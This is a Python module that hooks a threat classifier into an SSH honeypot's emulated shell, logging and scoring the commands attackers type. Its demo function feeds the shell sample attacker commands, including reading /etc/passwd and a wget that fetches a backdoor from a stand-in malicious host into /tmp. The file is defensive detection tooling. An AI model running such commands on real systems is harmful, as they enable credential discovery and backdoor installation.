import logging
import json
import threading
import uuid
from datetime import datetime
from threat_classification import ThreatClassifier

# Initialize threat classifier
threat_classifier = ThreatClassifier()

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("logs/honeypot_integration.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("HoneypotIntegration")

class ThreatClassificationHandler:
    """Handler for integrating threat classification with honeypots"""
    
    def __init__(self, threat_classifier=None):
        self.threat_classifier = threat_classifier or ThreatClassifier()
        self.session_mappings = {}  # honeypot_session_id -> threat_session_id
        
    def register_session(self, honeypot_session_id, client_ip, protocol="ssh", system_type="linux"):
        """Register a new honeypot session with the threat classifier"""
        # Create a unique ID for the threat classification session
        threat_session_id = str(uuid.uuid4())
        
        # Store the mapping
        self.session_mappings[honeypot_session_id] = threat_session_id
        
        logger.info(f"Registered new session: honeypot={honeypot_session_id}, threat={threat_session_id}, ip={client_ip}")
        
        return threat_session_id
        
    def classify_command(self, honeypot_session_id, client_ip, command, system_type="linux"):
        """Classify a command from a honeypot session"""
        # Get the threat session ID
        threat_session_id = self.session_mappings.get(honeypot_session_id)
        
        if not threat_session_id:
            # Session not registered, register it now
            threat_session_id = self.register_session(honeypot_session_id, client_ip, "ssh", system_type)
            
        # Classify the command
        result = self.threat_classifier.classify_command(
            threat_session_id, 
            client_ip, 
            command, 
            system_type
        )
        
        # Log high-severity threats
        if result["threat_severity"] in ["high", "critical"]:
            logger.warning(f"High severity threat detected: {result['threat_severity']} - {command} - {client_ip}")
            
        return result
        
    def get_session_summary(self, honeypot_session_id):
        """Get the threat summary for a honeypot session"""
        # Get the threat session ID
        threat_session_id = self.session_mappings.get(honeypot_session_id)
        
        if not threat_session_id:
            return {"error": "Session not found"}
            
        # Get the summary
        return self.threat_classifier.get_session_threat_summary(threat_session_id)
        
    def end_session(self, honeypot_session_id):
        """End a honeypot session"""
        # Get the threat session ID
        threat_session_id = self.session_mappings.get(honeypot_session_id)
        
        if threat_session_id:
            # Generate final summary
            summary = self.threat_classifier.get_session_threat_summary(threat_session_id)
            
            # Log session end
            logger.info(f"Session ended: honeypot={honeypot_session_id}, threat={threat_session_id}, max_severity={summary.get('max_threat_severity', 'unknown')}")
            
            # In a real system, you might save the summary to a database or file
            
            # Remove the mapping
            del self.session_mappings[honeypot_session_id]
            
            return summary
            
        return {"error": "Session not found"}


# Function to integrate with SSH honeypot
def integrate_with_ssh_honeypot(emulated_shell_class):
    """Modify the EmulatedShell class to integrate threat classification"""
    original_process_command = emulated_shell_class.process_command
    
    # Create handler
    handler = ThreatClassificationHandler(threat_classifier)
    
    def new_process_command(self, command):
        """Wrapped process_command function with threat classification"""
        # Call the original method
        result = original_process_command(self, command)
        
        # Classify the command
        try:
            threat_result = handler.classify_command(
                self.session_id,
                self.client_ip,
                command,
                "linux"  # Assuming Linux for SSH honeypot
            )
            
            # Log the threat classification result
            if hasattr(self, 'log_manager'):
                self.log_manager.main_logger.info(
                    f"Threat classification for command '{command}': {threat_result['threat_severity']}"
                )
                
            # Store threat data in session if possible
            if hasattr(self, 'session_attributes'):
                if 'threat_data' not in self.session_attributes:
                    self.session_attributes['threat_data'] = []
                self.session_attributes['threat_data'].append(threat_result)
                
        except Exception as e:
            logger.error(f"Error classifying command: {str(e)}")
            
        return result
        
    # Replace the method
    emulated_shell_class.process_command = new_process_command
    
    # Also hook into session end if possible
    if hasattr(emulated_shell_class, 'close'):
        original_close = emulated_shell_class.close
        
        def new_close(self):
            """Wrapped close function to end threat session"""
            try:
                # End the threat session
                handler.end_session(self.session_id)
            except Exception as e:
                logger.error(f"Error ending threat session: {str(e)}")
                
            # Call the original method
            return original_close(self)
            
        # Replace the method
        emulated_shell_class.close = new_close
        
    logger.info("Threat classification integrated with SSH honeypot")
    return handler


# Example patch function for ssh_honeypot_server.py
def patch_ssh_honeypot():
    """Patch the SSH honeypot to integrate threat classification"""
    try:
        # This would import from your actual SSH honeypot module
        # from ssh_honeypot_server import EmulatedShell
        
        # For demonstration, we'll create a mock class
        class MockEmulatedShell:
            def __init__(self):
                self.session_id = str(uuid.uuid4())
                self.client_ip = "192.168.1.100"
                self.log_manager = type('obj', (object,), {
                    'main_logger': logging.getLogger("MockLogger")
                })
                self.session_attributes = {}
                
            def process_command(self, command):
                print(f"Processing command: {command}")
                return True
                
            def close(self):
                print("Closing session")
                return True
        
        # Integrate threat classification
        handler = integrate_with_ssh_honeypot(MockEmulatedShell)
        
        # Test it
        shell = MockEmulatedShell()
        shell.process_command("whoami")
        shell.process_command("cat /etc/passwd")
        shell.process_command("wget http://malicious.com/backdoor -O /tmp/backdoor")
        shell.close()
        
        return True
    except Exception as e:
        logger.error(f"Error patching SSH honeypot: {str(e)}")
        return False


if __name__ == "__main__":
    # Test the integration
    patch_ssh_honeypot()